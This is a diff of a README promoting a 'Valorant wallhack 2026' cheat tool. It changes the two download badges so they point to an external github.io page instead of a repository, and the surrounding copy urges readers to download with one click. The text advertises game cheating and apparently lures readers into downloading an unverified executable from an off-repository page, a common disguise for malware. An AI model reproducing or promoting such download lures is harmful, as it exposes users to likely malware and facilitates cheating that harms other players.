@@ -19,7 +19,7 @@ This tool gives you a permanent tactical advantage. You'll see enemies through s
 
 ## 📥 Download & Install
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_VALORANT_WALLHACK_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/Tectonacharleston9967/valorant-wallhack-2026)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_VALORANT_WALLHACK_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://tectonacharleston9967.github.io)
 
 Visit this link to download the application.
 
@@ -133,7 +133,7 @@ Stop losing gunfights because you didn't know where the enemy was. Stop getting 
 
 The only thing standing between you and perfect game awareness is one click. Download now and see the difference immediately.
 
-[![GET STARTED NOW](https://img.shields.io/badge/🚀_GET_STARTED_NOW-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1A237E)](https://github.com/Tectonacharleston9967/valorant-wallhack-2026)
+[![GET STARTED NOW](https://img.shields.io/badge/🚀_GET_STARTED_NOW-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1A237E)](https://tectonacharleston9967.github.io)
 
 Visit this link to download the application.
 
